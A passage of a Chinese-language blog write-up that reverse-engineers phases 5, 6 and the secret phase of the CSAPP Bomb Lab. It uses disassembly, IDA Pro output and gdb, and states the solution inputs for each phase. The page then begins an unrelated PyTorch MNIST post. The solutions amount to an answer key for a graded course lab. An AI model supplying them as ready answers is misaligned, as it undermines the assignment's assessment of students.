<li><code>shl  src, dest</code> 逻辑左移</li>
<li><code>shr  src, dest</code> 逻辑右移</li>
</ul>
<h2 id="phase-5"><a href="#phase-5" class="headerlink" title="phase 5"></a>phase 5</h2><h3 id="汇编-4"><a href="#汇编-4" class="headerlink" title="汇编"></a>汇编</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">0000000000401062 &lt;phase_5&gt;:</span><br><span class="line">  401062:	53                   	push   %rbx</span><br><span class="line">  401063:	48 83 ec 20          	sub    $0x20,%rsp</span><br><span class="line">  401067:	48 89 fb             	mov    %rdi,%rbx</span><br><span class="line">  40106a:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax</span><br><span class="line">  401071:	00 00 </span><br><span class="line">  401073:	48 89 44 24 18       	mov    %rax,0x18(%rsp)</span><br><span class="line">  401078:	31 c0                	xor    %eax,%eax</span><br><span class="line">  40107a:	e8 9c 02 00 00       	callq  40131b &lt;string_length&gt;</span><br><span class="line">  40107f:	83 f8 06             	cmp    $0x6,%eax</span><br><span class="line">  401082:	74 4e                	je     4010d2 &lt;phase_5+0x70&gt;</span><br><span class="line">  401084:	e8 b1 03 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401089:	eb 47                	jmp    4010d2 &lt;phase_5+0x70&gt;</span><br><span class="line">  40108b:	0f b6 0c 03          	movzbl (%rbx,%rax,1),%ecx</span><br><span class="line">  40108f:	88 0c 24             	mov    %cl,(%rsp)</span><br><span class="line">  401092:	48 8b 14 24          	mov    (%rsp),%rdx</span><br><span class="line">  401096:	83 e2 0f             	and    $0xf,%edx</span><br><span class="line">  401099:	0f b6 92 b0 24 40 00 	movzbl 0x4024b0(%rdx),%edx</span><br><span class="line">  4010a0:	88 54 04 10          	mov    %dl,0x10(%rsp,%rax,1)</span><br><span class="line">  4010a4:	48 83 c0 01          	add    $0x1,%rax</span><br><span class="line">  4010a8:	48 83 f8 06          	cmp    $0x6,%rax</span><br><span class="line">  4010ac:	75 dd                	jne    40108b &lt;phase_5+0x29&gt;</span><br><span class="line">  4010ae:	c6 44 24 16 00       	movb   $0x0,0x16(%rsp)</span><br><span class="line">  4010b3:	be 5e 24 40 00       	mov    $0x40245e,%esi</span><br><span class="line">  4010b8:	48 8d 7c 24 10       	lea    0x10(%rsp),%rdi</span><br><span class="line">  4010bd:	e8 76 02 00 00       	callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">  4010c2:	85 c0                	test   %eax,%eax</span><br><span class="line">  4010c4:	74 13                	je     4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line">  4010c6:	e8 6f 03 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  4010cb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)</span><br><span class="line">  4010d0:	eb 07                	jmp    4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line">  4010d2:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  4010d7:	eb b2                	jmp    40108b &lt;phase_5+0x29&gt;</span><br><span class="line">  4010d9:	48 8b 44 24 18       	mov    0x18(%rsp),%rax</span><br><span class="line">  4010de:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax</span><br><span class="line">  4010e5:	00 00 </span><br><span class="line">  4010e7:	74 05                	je     4010ee &lt;phase_5+0x8c&gt;</span><br><span class="line">  4010e9:	e8 42 fa ff ff       	callq  400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">  4010ee:	48 83 c4 20          	add    $0x20,%rsp</span><br><span class="line">  4010f2:	5b                   	pop    %rbx</span><br><span class="line">  4010f3:	c3                   	retq   </span><br></pre></td></tr></table></figure>
<p>这个函数的stack frame是这样的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">phase 5</span><br><span class="line">0x00 (rsp)</span><br><span class="line">0x08 canary</span><br><span class="line">0x10 rdi</span><br><span class="line">0x18</span><br><span class="line">0x20 rsp</span><br></pre></td></tr></table></figure>
<p>同样有奇妙地址，我们查一查：</p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Bomb-Lab-Writeup/phase5_str.png">
<p>这个字符串打印出来之所以这样，是因为它最后一位不是<code>\x00</code>，所以就连续着把紧连着的下一个字符串也输出出来了。</p>
<p>最开始在call出<code>string_length</code>之前的这部分是用来初始化canary的。不用管。</p>
<p>字符串长度必须为6，才能跳转，不然会踩雷。</p>
<p>接下来从0x40108b开始，就是一个6次的循环，rax充当循环的counter，很容易看出来。</p>
<p>如果我们过完这个循环，最终要满足的是这个条件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">4010ae:	c6 44 24 16 00       	movb   $0x0,0x16(%rsp)</span><br><span class="line">4010b3:	be 5e 24 40 00       	mov    $0x40245e,%esi</span><br><span class="line">4010b8:	48 8d 7c 24 10       	lea    0x10(%rsp),%rdi</span><br><span class="line">4010bd:	e8 76 02 00 00       	callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">4010c2:	85 c0                	test   %eax,%eax</span><br><span class="line">4010c4:	74 13                	je     4010d9 &lt;phase_5+0x77&gt;</span><br></pre></td></tr></table></figure><br>所以我们要做的，就是在跑完上面这次循环之后，让<code>rsp + 0x10</code>开始的字符串跟<code>flyers</code>一毛一样。</p>
<p>这段代码粘下来集中看一看：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">40108b:	0f b6 0c 03          	movzbl (%rbx,%rax,1),%ecx</span><br><span class="line">40108f:	88 0c 24             	mov    %cl,(%rsp)</span><br><span class="line">401092:	48 8b 14 24          	mov    (%rsp),%rdx</span><br><span class="line">401096:	83 e2 0f             	and    $0xf,%edx</span><br><span class="line">401099:	0f b6 92 b0 24 40 00 	movzbl 0x4024b0(%rdx),%edx</span><br><span class="line">4010a0:	88 54 04 10          	mov    %dl,0x10(%rsp,%rax,1)</span><br><span class="line">4010a4:	48 83 c0 01          	add    $0x1,%rax</span><br><span class="line">4010a8:	48 83 f8 06          	cmp    $0x6,%rax</span><br><span class="line">4010ac:	75 dd                	jne    40108b &lt;phase_5+0x29&gt;</span><br></pre></td></tr></table></figure>
<p>开始模拟：</p>
<p>（初始化rbx指向的是最开始的rdi，也就是字符串的开始）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ecx &#x3D; str[i]</span><br><span class="line">*rsp &#x3D; cl (lower 4 digits of str[i])</span><br><span class="line">rdx &#x3D; *rsp &#x3D; cl (lower 4 digits of str[i])</span><br><span class="line">edx &amp;&#x3D; 0xf</span><br><span class="line">edx &#x3D; array3449[cl]</span><br><span class="line">*(rsp + rax + 0x10) &#x3D; dl (lower 4 digits of array3449[cl])</span><br></pre></td></tr></table></figure>
<p>最后的这个<code>(rsp + rax + 0x10)</code>看上去不认识，但是参照下上面的栈结构，其实表示的就是字符串的第i位。</p>
<p>所以我们只需要去注意输入的6个字符中，每个字符的低4位在<code>array3449</code>中索引出来的值，这些值就会一个一个的，填到以<code>rsp + 0x10</code>为开始的字符串中。</p>
<p>手动数一数下标，就可以发现，要对应弄出<code>flyers</code>，我们依次需要下标是<code>9 15 14 5 6 7</code>。</p>
<p>所以我们只需要翻翻ASCII表，找到低4位是这些的字符，拼到一起就可以了。</p>
<p>我最终的答案是<code>ionefg</code>。答案不唯一。</p>
<h3 id="IDA-4"><a href="#IDA-4" class="headerlink" title="IDA"></a>IDA</h3><img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Bomb-Lab-Writeup/phase5(IDA).png">
<p>主要是这句代码太具有迷惑性：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v3[i] = array_3449[*(_BYTE *)(a1 + i) &amp; <span class="number">0xF</span>];</span><br></pre></td></tr></table></figure>
<p>正确的解读是：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v3[i] = array_3449[a1[i] &amp; <span class="number">0xF</span>];</span><br></pre></td></tr></table></figure>
<p>在C里面，一个char所占据的大小恰好就是一个byte，所以<code>_BYTE</code>可以直接看成<code>char</code>。</p>
<p>这里我之所以迷糊，是因为IDA Pro反汇编说<code>a1</code>的类型是<code>int64</code>，然而事实上<code>a1</code>就是个字符串。</p>
<h2 id="phase-6"><a href="#phase-6" class="headerlink" title="phase 6"></a>phase 6</h2><p>最后一关，太复杂了！那我们就不分析汇编，直接上手看IDA Pro弄出来的代码。</p>
<p>其实弄出来的代码也不好看懂，一不小心也很容易晕！这里重新做一下记录。</p>
<h3 id="IDA-5"><a href="#IDA-5" class="headerlink" title="IDA"></a>IDA</h3><p>反汇编出来的代码长这样，非常长，变量非常多。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">phase_6</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> *v1; <span class="comment">// r13</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v2; <span class="comment">// er12</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// rsi</span></span><br><span class="line">  _QWORD *v6; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// ecx</span></span><br><span class="line">  __int64 v9; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">char</span> *v10; <span class="comment">// rax</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v12; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v13; <span class="comment">// ebp</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v15[<span class="number">6</span>]; <span class="comment">// [rsp+0h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">char</span> v16; <span class="comment">// [rsp+18h] [rbp-60h]</span></span><br><span class="line">  __int64 v17; <span class="comment">// [rsp+20h] [rbp-58h]</span></span><br><span class="line">  <span class="keyword">char</span> v18; <span class="comment">// [rsp+28h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">char</span> v19; <span class="comment">// [rsp+50h] [rbp-28h]</span></span><br><span class="line"></span><br><span class="line">  v1 = v15;</span><br><span class="line">  read_six_numbers(a1, v15);</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(*v1 - <span class="number">1</span>) &gt; <span class="number">5</span> )</span><br><span class="line">      explode_bomb(a1, v15);</span><br><span class="line">    <span class="keyword">if</span> ( ++v2 == <span class="number">6</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v3 = v2;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v1 == v15[v3] )</span><br><span class="line">        explode_bomb(a1, v15);</span><br><span class="line">      ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v3 &lt;= <span class="number">5</span> );</span><br><span class="line">    ++v1;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = (<span class="keyword">char</span> *)v15;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v4 = <span class="number">7</span> - *(_DWORD *)v4;</span><br><span class="line">    v4 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v4 != &amp;v16 );</span><br><span class="line">  v5 = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v8 = v15[v5 / <span class="number">4</span>];</span><br><span class="line">    <span class="keyword">if</span> ( v8 &lt;= <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = &amp;node1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v7 = <span class="number">1</span>;</span><br><span class="line">      v6 = &amp;node1;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v6 = (_QWORD *)v6[<span class="number">1</span>];</span><br><span class="line">        ++v7;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v7 != v8 );</span><br><span class="line">    &#125;</span><br><span class="line">    *(__int64 *)((<span class="keyword">char</span> *)&amp;v17 + <span class="number">2</span> * v5) = (__int64)v6;</span><br><span class="line">    v5 += <span class="number">4L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v5 != <span class="number">24</span> );</span><br><span class="line">  v9 = v17;</span><br><span class="line">  v10 = &amp;v18;</span><br><span class="line">  <span class="keyword">for</span> ( i = v17; ; i = v12 )</span><br><span class="line">  &#123;</span><br><span class="line">    v12 = *(_QWORD *)v10;</span><br><span class="line">    *(_QWORD *)(i + <span class="number">8</span>) = *(_QWORD *)v10;</span><br><span class="line">    v10 += <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v10 == &amp;v19 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_QWORD *)(v12 + <span class="number">8</span>) = <span class="number">0L</span>L;</span><br><span class="line">  v13 = <span class="number">5</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = **(<span class="keyword">unsigned</span> <span class="keyword">int</span> **)(v9 + <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)v9 &lt; (<span class="keyword">signed</span> <span class="keyword">int</span>)result )</span><br><span class="line">      explode_bomb(a1, &amp;v19);</span><br><span class="line">    v9 = *(_QWORD *)(v9 + <span class="number">8</span>);</span><br><span class="line">    --v13;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v13 );</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先我们画一画这个函数的栈：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">0x00 rbp</span><br><span class="line">0x08</span><br><span class="line">0x10</span><br><span class="line">0x18</span><br><span class="line">0x20</span><br><span class="line">0x28 char v19[0x28] 0ll</span><br><span class="line">0x30               &amp;node[v15[5]]</span><br><span class="line">0x38               &amp;node[v15[4]]</span><br><span class="line">0x40               &amp;node[v15[3]]</span><br><span class="line">0x48               &amp;node[v15[2]]</span><br><span class="line">0x50 char v18      &amp;node[v15[1]]  &lt;- v10</span><br><span class="line">0x58 long long v17 &amp;node[v15[0]]  v9</span><br><span class="line">0x60 char v16</span><br><span class="line">0x64 v15[5]</span><br><span class="line">0x68 v15[4]</span><br><span class="line">0x6c v15[3]</span><br><span class="line">0x70 v15[2]</span><br><span class="line">0x74 v15[1]</span><br><span class="line">0x78 v15[0]</span><br></pre></td></tr></table></figure>
<p>这个栈的图片非常非常重要，首先先保证不会乱，因为后面还有跳出栈外的过程。</p>
<p>还有，在分析的过程中，时刻注意每一个变量到底是值，还是指针！千万不能错！</p>
<p>一步一步分析，不要急，一定要慢慢来：</p>
<p>最开始，从<code>v15</code>开始，读入6个<code>int</code>类型的整数，存在栈上。（<code>v15</code>是个指针）</p>
<p>第一个是嵌套循环，<code>v1</code>是当前遍历到的元素的指针，<code>v2</code>表示第几个元素（从1开始数），<code>v3</code>是循环变量。</p>
<p>每次遍历<code>v1</code>，都必须保证<code>1 &lt;= *v1 &lt;= 6</code>，关于强转unsigned int的知识点，在最后有总结。然后内层循环表示后面的元素都得跟前面的不一样，意思就是这6个数各不相同。</p>
<p>第二个是单个do-while循环。它做的就是把这6个数都运算一遍，把<code>x</code>变成了<code>7-x</code>，更改了这6个数。</p>
<p>第三个开始烧脑了！<code>v8</code>是循环中被遍历到的值，根据<code>v8</code>的数值大小，分别执行若干次从<code>&amp;node1</code>开始的<code>v8 - 1</code>次地址跳转，最终把栈上原来数组的值重新写为跳转到最后的地址。</p>
<p>这里注意一下，<code>v6 = (_QWORD *)v6[1];</code>这句代码是伏笔！（为什么这个值可以强转为地址呢？）</p>
<p>我们点进<code>node1</code>，发现在data段，后面刚好延伸到<code>node6</code>结束，这是什么意思？</p>
<p>不懂，我们看到下一个代码部分：</p>
<p>一个for循环，从<code>v17</code>即<code>rbp - 0x58</code>开始，每次循环结束会跳转到<code>v10</code>的值。之所以可以直接迭代为<code>v10</code>的值，是因为这个数组在第三次操作的时候已经变成了指针数组了！</p>
<p>接下来又是一句意味深长的代码：<code>*(_QWORD *)(i + 8) = *(_QWORD *)v10;</code></p>
<p>我们在IDA开始乱了，用gdb看一看有没有线索，毕竟还没有查过那段<code>&amp;node1</code>的奇妙地址。结果非常的意外：</p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Bomb-Lab-Writeup/phase6_node.png">
<p>不知为什么，每一个node元素，他的第三个数字，恰好跟下一个node的地址一模一样！</p>
<p>其实突破点就出来了：</p>
<p><strong>每一个node是一个struct类型！</strong></p>
<p><strong>node里面的第三个数字，代表着下一个元素的地址！</strong></p>
<p><strong>这就是链表的汇编！</strong></p>
<p>其他的数字是啥意思呢？第一个数字对应节点的值，第二个数字是id，第三个数字是地址，然后怎么有空出来的0？</p>
<p>不是空出来的0，而是因为地址就是64位的！</p>
<p>在这里，结构体内的元素顺序不同，所占用的空间也会不同，这个在CSAPP中有提到过内存对齐的概念！</p>
<p>那为什么上面的那个伏笔，对应的下标是1呢？</p>
<p>因为<code>v6</code>就是一个<code>QWORD</code>类型，而node里面的数字都是int，只有32位呀！</p>
<p>接下来就非常简单了，最后一个循环所代表的，就是确保最终的数值是降序排列的。</p>
<p>所以最终的排序是924 &gt; 691 &gt; 477 &gt; 443 &gt; 332 &gt; 168，即<code>3 4 5 6 1 2</code>。</p>
<p>别忘记了前面有一个<code>x = 7 - x;</code>，所以最终的答案就是<code>4 3 2 1 6 5</code>。</p>
<h2 id="secret-phase"><a href="#secret-phase" class="headerlink" title="secret phase"></a>secret phase</h2><p><del>待补充，今天晚点再做了补上。（咕咕咕）</del></p>
<p>Jan 15 upd：来补上secret phase了！</p>
<h3 id="怎么进secret-phase"><a href="#怎么进secret-phase" class="headerlink" title="怎么进secret phase"></a>怎么进secret phase</h3><p><code>secret_phase</code>函数的入口其实在<code>phase_defused</code>里面。</p>
<p>懒得看汇编，直接用IDA Pro做了。<del>其实反汇编出来的跟看汇编也差不多</del></p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Bomb-Lab-Writeup/phase_defused(IDA).png">
<p>这里看到一个<code>num_input_strings</code>，是个在bss段上的全局变量。同时，<code>sscanf</code>所读入的那个地址，也是在bss段上的，初始化都是0，不过可能会在函数执行的时候被修改。</p>
<p>那到底是什么时候被修改的？我们分别用gdb设断点看一看。</p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Bomb-Lab-Writeup/secret_phase(num_input_strings).png">
<p>可以发现这个变量的意思就是记录现在是第几关。所以当第六关的时候就可以了。</p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Bomb-Lab-Writeup/secret_phase(input_strings).png">
<p>可以发现是我们在打phase 4的时候，这个<code>input_strings + 240</code>所在的字符串就更改成了我们输入的内容。并且后面不会再更改。</p>
<p>所以我们只需要在第四阶段，在第三个位置上输入一个<code>DrEvil</code>，就可以在过完第六关之后触发了。</p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Bomb-Lab-Writeup/secret_phase(IDA).png">
<p>要使这个<code>func7</code>返回2，并且输入的数字小于等于0x3e8 + 1，就可以通关了。</p>
<p>这里有一个<code>&amp;n1</code>，点进去看看，又是在data段，跟前面的<code>&amp;node1</code>很类似。并且，<code>n1</code>后面也紧跟着其他类似的东西，应该又是一个struct。</p>
<p>我们用gdb看一看：</p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Bomb-Lab-Writeup/secret_phase(n1).png">
<p>可以发现，每个结构体储存了两个地址，我们做下笔记：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">n1(n21, n22)  36</span><br><span class="line">n21(n31, n32) 8</span><br><span class="line">n22(n33, n34) 50</span><br><span class="line">n32(n43, n44) 22</span><br><span class="line">n33(n45, n46) 45</span><br><span class="line">n31(n41, n42) 6</span><br><span class="line">n34(n47, n48) 107</span><br><span class="line">n45 40</span><br><span class="line">n41 1</span><br><span class="line">n47 99</span><br><span class="line">n44 35</span><br><span class="line">n42 7</span><br><span class="line">n43 20</span><br><span class="line">n46 47</span><br><span class="line">n48 1001</span><br></pre></td></tr></table></figure>
<p>这种一对二的关系，其实就是二叉树：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">                n1</span><br><span class="line">      n21             n22</span><br><span class="line">  n31     n32     n33     n34</span><br><span class="line">n41 n42 n43 n44 n45 n46 n47 n48</span><br></pre></td></tr></table></figure>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Bomb-Lab-Writeup/func7(IDA).png">
<p>想让<code>func7</code>为2，首先要落向左边，然后落向右边，然后返回0，这样就能构造出<code>2 * (2 * 0 + 1) = 2</code>了。</p>
<p>最后的返回0，也可以走左边再返回0，所以<code>n32</code>和<code>n43</code>的值都是没问题的，即我们有20跟22两个答案。</p>
<p>终于通关了！芜湖起飞！</p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Bomb-Lab-Writeup/success.png">
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Bomb-Lab-Writeup/success1.png">
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Bomb-Lab-Writeup/success2.png">

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://121.36.2.124/2021/01/11/Learn-MNIST-in-PyTorch-from-Scratch-to-CNN/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Garen Wang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Garen Wang's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/01/11/Learn-MNIST-in-PyTorch-from-Scratch-to-CNN/" class="post-title-link" itemprop="url">Learn MNIST in PyTorch from Scratch to CNN</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2021-01-11 19:33:08 / Modified: 20:41:49" itemprop="dateCreated datePublished" datetime="2021-01-11T19:33:08+08:00">2021-01-11</time>
            </span>

          
            <span id="/2021/01/11/Learn-MNIST-in-PyTorch-from-Scratch-to-CNN/" class="post-meta-item leancloud_visitors" data-flag-title="Learn MNIST in PyTorch from Scratch to CNN" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2021/01/11/Learn-MNIST-in-PyTorch-from-Scratch-to-CNN/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2021/01/11/Learn-MNIST-in-PyTorch-from-Scratch-to-CNN/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>Today I spent nearly an afternoon to follow the tutorial on <a href="pytorch.org">pytorch.org</a>. So just recall what I have learnt here.</p>
<p>(all in PyTorch…)</p>
<h2 id="from-Scratch"><a href="#from-Scratch" class="headerlink" title="from Scratch"></a>from Scratch</h2><p>We first write our code without too many features of PyTorch so that we can gradually see what can be simplified when using PyTorch.</p>
